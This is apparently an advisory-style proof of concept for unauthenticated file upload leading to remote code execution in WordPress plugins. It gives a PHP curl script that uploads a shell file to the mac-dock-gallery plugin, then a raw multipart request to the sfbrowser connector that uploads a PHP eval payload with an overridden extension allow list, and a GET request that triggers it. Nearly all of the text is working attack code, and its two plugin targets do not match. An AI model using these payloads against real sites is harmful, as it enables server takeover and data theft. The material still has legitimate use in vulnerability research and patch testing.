[PoC]

	<?php
		$u="shell.php.php";
		$c = curl_init("http://{TARGET}/wp-content/plugins/mac-dock-gallery/upload-file.php");
		curl_setopt($c, CURLOPT_POST, true);
		curl_setopt($c, CURLOPT_POSTFIELDS,
		array('uploadfile'=>"@$u",
		'albumId'=>"1",
		'mode'=>"image"));
		curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
		$e = curl_exec($c);
		curl_close($c);
		echo $e; 
	?>
[HTTP REQUEST]

	POST /{TARGET}/wp-content/plugins/sfbrowser/connectors/php/sfbrowser.php HTTP/1.1
	Host: {TARGET}
	Accept: */*
	Content-Length: 697
	Content-Type: multipart/form-data; boundary=------------------------4b3c10a9b84bdd90


	--------------------------4b3c10a9b84bdd90
	Content-Disposition: form-data; name="fileToUpload"; filename="exploit.ptxt"

	<?php @eval("echo 'VT-2018-00417';");
	--------------------------4b3c10a9b84bdd90
	Content-Disposition: form-data; name="a"

	upload
	--------------------------4b3c10a9b84bdd90
	Content-Disposition: form-data; name="file"


	--------------------------4b3c10a9b84bdd90
	Content-Disposition: form-data; name="deny"

	lam
	--------------------------4b3c10a9b84bdd90
	Content-Disposition: form-data; name="allow"

	exe|ptxt|sh
	--------------------------4b3c10a9b84bdd90
	Content-Disposition: form-data; name="resize"

	Array
	--------------------------4b3c10a9b84bdd90--

[HTTP REQUEST TRIGGER]
	GET /{TARGET}/wp-content/plugins/sfbrowser/exploit.ptxt HTTP/1.1
	Host: {TARGET}
	User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
	Accept-Language: en-US,en;q=0.5
	Connection: close
	Upgrade-Insecure-Requests: 1
	If-Modified-Since: Tue, 21 Aug 2018 03:02:21 GMT
	If-None-Match: "25-573e941296984"

